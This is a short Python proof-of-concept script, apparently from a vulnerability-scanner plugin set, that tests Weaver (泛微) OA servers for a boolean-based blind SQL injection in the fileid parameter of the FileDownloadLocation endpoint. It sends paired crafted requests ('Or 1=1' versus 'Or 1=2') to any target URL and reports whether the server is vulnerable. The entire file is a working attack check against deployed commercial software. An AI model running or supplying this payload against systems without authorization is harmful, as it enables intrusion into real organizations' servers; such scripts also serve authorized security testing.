#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 泛微OA filedownaction SQL注入
referer: https://wooyun.shuimugan.com/bug/view?bug_no=76418
author: Lucifer
description: fileid参数引起的布尔盲注。
'''
import sys
import requests
import warnings
def run(url):
        result = ['泛微OA filedownaction SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        true_url = r"/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=1"
        false_url = r"/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=2"

        try:
            req1 = requests.get(url+true_url, headers=headers, timeout=10, verify=False)
            req2 = requests.get(url+false_url, headers=headers, timeout=10, verify=False)
            if r"attachment" in str(req1.headers) and r"attachment" not in str(req2.headers):
                result[2]=  '存在'
                result[1]=url+true_url
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
